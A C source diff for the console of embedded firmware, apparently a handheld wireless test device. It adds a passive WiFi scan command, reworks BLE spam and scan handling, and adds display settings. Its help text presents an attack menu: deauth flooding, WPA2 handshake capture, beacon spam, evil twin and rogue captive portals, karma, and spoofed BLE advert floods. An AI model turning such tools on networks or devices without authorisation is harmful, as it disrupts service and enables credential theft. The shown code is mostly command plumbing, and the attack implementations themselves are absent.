+        if (pcap_path) kon_printf(ks,"[eapol] pcap=%s\r\n", pcap_path);
+        hl_run_foreground(ks);
+        return 0;
+    }
+
+    /* ---- scan ---- */
+    if (bs_stricmp(sub, "scan") == 0) {
+        bool want_help = false;
+        uint32_t timeout_s = 10;
+        for (int i = 2; i < argc; i++) {
+            if (!strcmp(argv[i],"--help")||!strcmp(argv[i],"-h")) { want_help=true; break; }
+            else if (!strcmp(argv[i],"--timeout") && i+1<argc) {
+                int s=atoi(argv[i+1]); if(s>0) timeout_s=(uint32_t)s; i++;
+            } else {
+                kon_printf(ks,"Unknown argument: %s  (run with --help)\r\n",argv[i]); return 1;
+            }
+        }
+        if (want_help) {
+            kon_printf(ks,
+                "wifi scan [OPTIONS]\r\n"
+                "  Passive AP discovery: hops all channels, collects beacons and probe responses.\r\n"
+                "Options:\r\n"
+                "  --timeout N  scan duration in seconds (default: 10)\r\n"
+                "Results sorted by signal strength (RSSI) when done.\r\n");
+            return 0;
+        }
+        if (s_hl_mode != HL_IDLE) hl_stop();
+        if (bs_wifi_init(s_arch) < 0) { kon_printf(ks, "WiFi init failed.\r\n"); return 1; }
+        s_scan_ap_count = 0;
+        memset(s_scan_aps, 0, sizeof s_scan_aps);
+        sniffer_svc_init(s_arch);
+        sniffer_svc_start(0, 500, scan_beacon_cb, NULL);
+        kon_printf(ks,"[scan] passive AP discovery  timeout=%lus\r\n",(unsigned long)timeout_s);
+        uint32_t t0 = s_arch->millis();
+        bool aborted = false;
+        for (;;) {
+            uint8_t ibuf[4];
+            int n = s_arch->uart_read(0, ibuf, (int)sizeof(ibuf));
+            for (int i = 0; i < n; i++) {
+                if (ibuf[i]=='q'||ibuf[i]=='Q'||ibuf[i]==0x03) { aborted=true; break; }
+            }
+            if (aborted) break;
+            sniffer_svc_tick(s_arch->millis());
+            if ((s_arch->millis() - t0) >= timeout_s * 1000u) break;
+            s_arch->delay_ms(10);
+        }
+        sniffer_svc_stop();
+        bs_wifi_deinit();
+        int count = s_scan_ap_count;
+        if (aborted) kon_printf(ks,"Aborted. ");
+        kon_printf(ks,"%d AP(s) found:\r\n", count);
+        if (count > 0) {
+            /* Bubble-sort by RSSI descending */
+            for (int i = 0; i < count - 1; i++)
+                for (int j = i + 1; j < count; j++)
+                    if (s_scan_aps[j].rssi > s_scan_aps[i].rssi) {
+                        scan_ap_t tmp = s_scan_aps[i];
+                        s_scan_aps[i] = s_scan_aps[j];
+                        s_scan_aps[j] = tmp;
+                    }
+            kon_printf(ks,"  #   ch  rssi  pkts  BSSID              SSID\r\n");
+            for (int i = 0; i < count; i++) {
+                char mac[18]; bs_wifi_bssid_str(s_scan_aps[i].bssid, mac);
+                kon_printf(ks,"  %2d  %2d  %4d  %4d  %s  %s\r\n",
+                           i, s_scan_aps[i].channel, (int)s_scan_aps[i].rssi,
+                           s_scan_aps[i].count,
+                           mac,
+                           s_scan_aps[i].ssid[0] ? s_scan_aps[i].ssid : "<hidden>");
+            }
+        }
+        return 0;
+    }
+
+    /* Unknown subcommand — error unless it's a help flag */
+    if (strcmp(sub,"-h")!=0 && strcmp(sub,"--help")!=0) {
+        kon_printf(ks,"Unknown wifi subcommand: %s\r\nRun 'wifi' for help.\r\n", sub);
+        return 1;
+    }
+    kon_printf(ks,
+        "wifi - 802.11 attack toolset\r\n"
+        "  wifi scan     [--help]  passive AP discovery\r\n"
+        "  wifi beacon   [--help]  beacon spam, rotating channels\r\n"
+        "  wifi deauth   [--help]  deauth flood - broadcast/targeted\r\n"
+        "  wifi deauth   scan      active AP scan (no attack)\r\n");
+    kon_printf(ks,
+        "  wifi sniff    [--help]  passive capture, filters, pcap, timeout\r\n"
+        "  wifi eapol    [--help]  WPA2 handshake capture (+ deauth trigger)\r\n"
+#if defined(BS_WIFI_ESP32) && defined(ARDUINO_ARCH_ESP32)
+        "  wifi captive  [--help]  rogue AP + captive portal\r\n"
+        "  wifi eviltwin [--help]  clone AP + deauth-triggered redirect chain\r\n"
+#endif
+        );
+#if defined(BS_WIFI_ESP32) && defined(ARDUINO_ARCH_ESP32)
+    kon_printf(ks,
+        "  wifi honeypot [--help]  clone AP + CSA/deauth lures\r\n"
+        "  wifi karma    [--help]  probe-response rogue AP (13ch hop)\r\n"
+        "  wifi          show attack status and caps\r\n"
+        "Each command blocks; q / Ctrl+C to stop.\r\n");
+#else
+    kon_printf(ks,
+        "  wifi          show attack status and caps\r\n"
+        "Each command blocks; q / Ctrl+C to stop.\r\n");
+#endif
     return 0;
 }
 #endif /* BS_HAS_WIFI */
@@ -665,75 +1714,87 @@ static int cmd_ble(struct konsole* ks, int argc, char** argv) {
         return 0;
     }
 
-    const char* sub  = argv[1];
-    const char* verb = (argc >= 3) ? argv[2] : "";
+    const char* sub = argv[1];
 
     /* ---- spam ---- */
     if (bs_stricmp(sub, "spam") == 0) {
-        if (bs_stricmp(verb, "stop") == 0) {
-            if (s_hl_mode == HL_BLE_SPAM) { hl_stop(); kon_printf(ks, "BLE spam stopped.\r\n"); }
-            else kon_printf(ks, "Not running.\r\n");
+        bool want_help = false;
+        for (int i = 2; i < argc && !want_help; i++)
+            if (!strcmp(argv[i],"--help")||!strcmp(argv[i],"-h")) want_help=true;
+        if (want_help) {
+            kon_printf(ks,
+                "ble spam [OPTIONS]\r\n"
+                "  Flood BLE advert space with spoofed vendor frames.\r\n"
+                "Options:\r\n"
+                "  --mode apple|samsung|google|name|all  advert type (default: all)\r\n"
+                "  --ivl N   interval ms (default: 100)\r\n"
+                "  Stats every 5s. q / Ctrl+C to stop.\r\n");
             return 0;
         }
-        if (bs_stricmp(verb, "start") == 0) {
-            if (s_hl_mode != HL_IDLE) hl_stop();
-            if (bs_ble_init(s_arch) < 0) { kon_printf(ks, "BLE init failed.\r\n"); return 1; }
-            ble_spam_mode_t mode       = BLE_SPAM_ALL;
-            uint32_t        interval   = 100;
-            for (int i = 3; i < argc - 1; i++) {
-                if (strcmp(argv[i], "--mode") == 0 && i+1 < argc) {
-                    const char* m = argv[i+1];
-                    if      (bs_stricmp(m,"apple")   == 0) mode = BLE_SPAM_APPLE;
-                    else if (bs_stricmp(m,"samsung") == 0) mode = BLE_SPAM_SAMSUNG;
-                    else if (bs_stricmp(m,"google")  == 0) mode = BLE_SPAM_GOOGLE;
-                    else if (bs_stricmp(m,"name")    == 0) mode = BLE_SPAM_NAME;
-                    else if (bs_stricmp(m,"all")     == 0) mode = BLE_SPAM_ALL;
-                    i++;
-                } else if (strcmp(argv[i], "--ivl") == 0 && i+1 < argc) {
-                    int ms = atoi(argv[i+1]);
-                    if (ms > 0) interval = (uint32_t)ms;
-                    i++;
-                }
+        if (s_hl_mode != HL_IDLE) hl_stop();
+        if (bs_ble_init(s_arch) < 0) { kon_printf(ks,"BLE init failed.\r\n"); return 1; }
+        ble_spam_mode_t mode     = BLE_SPAM_ALL;
+        uint32_t        interval = 100;
+        for (int i = 2; i < argc; i++) {
+            if (!strcmp(argv[i],"--mode")&&i+1<argc) {
+                const char* m=argv[++i];
+                if      (bs_stricmp(m,"apple")  ==0) mode=BLE_SPAM_APPLE;
+                else if (bs_stricmp(m,"samsung")==0) mode=BLE_SPAM_SAMSUNG;
+                else if (bs_stricmp(m,"google") ==0) mode=BLE_SPAM_GOOGLE;
+                else if (bs_stricmp(m,"name")   ==0) mode=BLE_SPAM_NAME;
+                else                                  mode=BLE_SPAM_ALL;
+            } else if (!strcmp(argv[i],"--ivl")&&i+1<argc) {
+                int ms=atoi(argv[++i]); if(ms>0) interval=(uint32_t)ms;
+            } else {
+                kon_printf(ks,"Unknown argument: %s  (run with --help)\r\n",argv[i]); return 1;
             }
-            ble_spam_svc_init(s_arch);
-            ble_spam_svc_start(mode, interval);
-            s_hl_mode        = HL_BLE_SPAM;
-            s_hl_ks          = ks;
-            s_hl_last_report = 0;
-            kon_printf(ks, "BLE spam started (mode=%s  ivl=%lums).\r\n"
-                           "Reports every 5 s.  'ble spam stop' to halt.\r\n",
-                       k_ble_spam_mode_names[mode], (unsigned long)interval);
-            return 0;
         }
-        kon_printf(ks, "Usage: ble spam start|stop [--mode apple|samsung|google|name|all] [--ivl ms]\r\n");
+        ble_spam_svc_init(s_arch);
+        ble_spam_svc_start(mode, interval);
+        s_hl_mode=HL_BLE_SPAM; s_hl_ks=ks; s_hl_last_report=0;
+        kon_printf(ks,"[ble-spam] mode=%s  ivl=%lums\r\n",
+                   k_ble_spam_mode_names[mode],(unsigned long)interval);
+        hl_run_foreground(ks);
         return 0;
     }
 
     /* ---- scan ---- */
     if (bs_stricmp(sub, "scan") == 0) {
-        if (bs_stricmp(verb, "stop") == 0) {
-            if (s_hl_mode == HL_BLE_SCAN) { hl_stop(); kon_printf(ks, "BLE scan stopped.\r\n"); }
-            else kon_printf(ks, "Not running.\r\n");
+        bool want_help = false;
+        for (int i = 2; i < argc && !want_help; i++)
+            if (!strcmp(argv[i],"--help")||!strcmp(argv[i],"-h")) want_help=true;
+        if (want_help) {
+            kon_printf(ks,
+                "ble scan\r\n"
+                "  Passive BLE device discovery.\r\n"
+                "  New device count printed every 3s. Press q / Ctrl+C to stop.\r\n");
             return 0;
         }
-        if (bs_stricmp(verb, "start") == 0) {
-            if (s_hl_mode != HL_IDLE) hl_stop();
-            if (bs_ble_init(s_arch) < 0) { kon_printf(ks, "BLE init failed.\r\n"); return 1; }
-            ble_scan_svc_init(s_arch);
-            ble_scan_svc_start();
-            s_hl_mode        = HL_BLE_SCAN;
-            s_hl_ks          = ks;
-            s_hl_last_report = 0;
-            s_hl_last_total  = 0;
-            kon_printf(ks, "BLE scan started.\r\n"
-                           "Reports every 3 s.  'ble scan stop' to halt.\r\n");
-            return 0;
+        for (int i = 2; i < argc; i++) {
+            if (!strcmp(argv[i],"--help")||!strcmp(argv[i],"-h")) continue;
+            kon_printf(ks,"Unknown argument: %s  (run with --help)\r\n",argv[i]); return 1;
         }
-        kon_printf(ks, "Usage: ble scan start|stop\r\n");
+        if (s_hl_mode != HL_IDLE) hl_stop();
+        if (bs_ble_init(s_arch) < 0) { kon_printf(ks,"BLE init failed.\r\n"); return 1; }
+        ble_scan_svc_init(s_arch);
+        ble_scan_svc_start();
+        s_hl_mode=HL_BLE_SCAN; s_hl_ks=ks; s_hl_last_report=0; s_hl_last_total=0;
+        kon_printf(ks,"[ble-scan] scanning...\r\n");
+        hl_run_foreground(ks);
         return 0;
     }
 
-    kon_printf(ks, "Usage: ble spam|scan start|stop [...]\r\n");
+    /* Unknown subcommand — error unless it's a help flag */
+    if (strcmp(sub,"-h")!=0 && strcmp(sub,"--help")!=0) {
+        kon_printf(ks,"Unknown ble subcommand: %s\r\nRun 'ble' for help.\r\n", sub);
+        return 1;
+    }
+    kon_printf(ks,
+        "ble - Bluetooth Low Energy toolset\r\n"
+        "  ble spam [--help]  advert flood (Apple/Samsung/Google/name)\r\n"
+        "  ble scan [--help]  passive BLE device discovery\r\n"
+        "  ble                show active BLE status and caps\r\n"
+        "Each command blocks; q / Ctrl+C to stop.\r\n");
     return 0;
 }
 #endif /* BS_HAS_BLE */
@@ -754,7 +1815,7 @@ static int cmd_opts(struct konsole* ks, int argc, char** argv) {
     /* opts sdinfo */
     if (argc >= 2 && bs_stricmp(argv[1], "sdinfo") == 0) {
         if (bs_fs_available()) {
-            long log_sz = bs_fs_file_size("system.log");
+            long log_sz = bs_fs_file_size(BS_PATH_LOG);
             if (log_sz >= 0)
                 kon_printf(ks, "SD: mounted  log=%ld B\r\n", log_sz);
             else
@@ -795,14 +1856,16 @@ static int cmd_opts(struct konsole* ks, int argc, char** argv) {
             return 1;
         }
         char buf[256];
-        float ts = bs_ui_text_scale();
         int n = snprintf(buf, sizeof buf,
-            "layout=%d\ntext_scale=%.1f\nbrightness=%d\nshow_voltage=%d\n"
-            "header_brand=%d\ngrid_cols=%d\ngrid_rows=%d\n",
-            (int)bs_menu_get_mode(), (double)ts, bs_ui_brightness(),
+            "layout=%d\ngrid_cols=%d\ngrid_rows=%d\npalette=%d\nborder=%d\n"
+            "text_scale=%.1f\nbrightness=%d\nshow_voltage=%d\ncarousel=%d\nheader_brand=%d\n",
+            (int)bs_menu_get_mode(),
+            bs_ui_grid_max_cols(), bs_ui_grid_max_rows(),
+            bs_ui_palette_idx(), bs_ui_border_idx(),
+            (double)bs_ui_text_scale(), bs_ui_brightness(),
             (int)bs_ui_show_voltage(),
-            bs_ui_header_brand_mode(), bs_ui_grid_max_cols(), bs_ui_grid_max_rows());
-        bs_fs_write_file("settings.cfg", buf, (size_t)n);
+            (int)bs_ui_carousel_enabled(), bs_ui_header_brand_mode());
+        bs_fs_write_file(BS_PATH_SETTINGS, buf, (size_t)n);
         kon_printf(ks, "Settings saved.\r\n");
         return 0;
     }
@@ -871,8 +1934,38 @@ static int cmd_opts(struct konsole* ks, int argc, char** argv) {
             kon_printf(ks, "grid_rows=%d\r\n", bs_ui_grid_max_rows());
             return 0;
         }
+        if (bs_stricmp(key, "palette") == 0) {
+            int idx = atoi(val);
+            if (idx < 0 || idx >= BS_PALETTE_COUNT) {
+                kon_printf(ks, "palette: 0-%d\r\n", BS_PALETTE_COUNT - 1); return 1;
+            }
+            bs_ui_set_palette_idx(idx);
+            bs_theme_apply(idx, (bs_border_style_t)bs_ui_border_idx());
+            bs_menu_invalidate();
+            kon_printf(ks, "palette=%d\r\n", idx);
+            return 0;
+        }
+        if (bs_stricmp(key, "border") == 0) {
+            int idx = atoi(val);
+            if (idx < 0 || idx >= BS_BORDER_STYLE_COUNT) {
+                kon_printf(ks, "border: 0-%d\r\n", BS_BORDER_STYLE_COUNT - 1); return 1;
+            }
+            bs_ui_set_border_idx(idx);
+            bs_theme_apply(bs_ui_palette_idx(), (bs_border_style_t)idx);
+            bs_menu_invalidate();
+            kon_printf(ks, "border=%d\r\n", idx);
+            return 0;
+        }
+        if (bs_stricmp(key, "carousel") == 0) {
+            bool on = (bs_stricmp(val,"on")==0 || strcmp(val,"1")==0);
+            bs_ui_set_carousel(on);
+            kon_printf(ks, "carousel=%s\r\n", on ? "on" : "off");
+            return 0;
+        }
         kon_printf(ks, "Unknown key '%s'.\r\n", key);
-        kon_printf(ks, "Keys: text_scale brightness layout voltage header_brand grid_cols grid_rows\r\n");
+        kon_printf(ks, "Keys: text_scale brightness layout voltage\r\n");
+        kon_printf(ks, "      header_brand grid_cols grid_rows\r\n");
+        kon_printf(ks, "      palette border carousel\r\n");
         return 1;
     }
 
@@ -891,6 +1984,9 @@ static int cmd_opts(struct konsole* ks, int argc, char** argv) {
     kon_printf(ks, "  brightness  = %d%%\r\n", bs_ui_brightness());
     kon_printf(ks, "  layout      = %d (%s)\r\n", lm,
                lm >= 0 && lm <= 3 ? k_layout_names[lm] : "?");
+    kon_printf(ks, "  palette     = %d  border=%d\r\n",
+               bs_ui_palette_idx(), bs_ui_border_idx());
+    kon_printf(ks, "  carousel    = %s\r\n", bs_ui_carousel_enabled() ? "on" : "off");
     kon_printf(ks, "  voltage     = %s\r\n", bs_ui_show_voltage() ? "on" : "off");
     kon_printf(ks, "  header_brand= %s\r\n", bs_ui_header_brand_mode() ? "logo" : "text");
     kon_printf(ks, "  grid_cols   = %d\r\n", bs_ui_grid_max_cols());
@@ -913,10 +2009,10 @@ static const struct kon_cmd k_cmds[] = {
     { "opts",         "show/set settings (opts sdinfo|sdformat)",  cmd_opts },
     { "startapp",     "launch app by name",         cmd_startapp     },
 #ifdef BS_HAS_WIFI
-    { "wifi",  "wifi beacon|deauth|sniff start|stop [options]", cmd_wifi  },
+    { "wifi",  "wifi scan|beacon|deauth|sniff|eapol|captive|eviltwin|honeypot|karma [--help]", cmd_wifi },
 #endif
 #ifdef BS_HAS_BLE
-    { "ble",   "ble spam|scan start|stop [options]",            cmd_ble   },
+    { "ble",   "ble spam|scan [--help]",  cmd_ble  },
 #endif
 };
 
